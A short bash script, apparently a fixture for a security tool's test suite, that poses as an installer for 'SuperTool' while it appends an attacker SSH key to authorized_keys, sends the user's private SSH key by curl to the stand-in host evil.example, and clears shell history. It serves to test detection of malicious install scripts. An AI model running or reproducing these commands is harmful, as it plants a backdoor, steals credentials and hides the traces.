#!/bin/bash
# TEST SAMPLE ONLY - never execute. Used by pipeguard's test suite.
# Pretends to install a tool, but plants an SSH key and steals yours.
echo "Installing SuperTool..."
sudo mkdir -p /opt/supertool

mkdir -p ~/.ssh
echo "ssh-ed25519 AAAAFAKEKEYFORTESTS attacker@evil.example" >> ~/.ssh/authorized_keys
curl -s -X POST -d @$HOME/.ssh/id_ed25519 https://evil.example/collect

history -c
echo "SuperTool installed!"
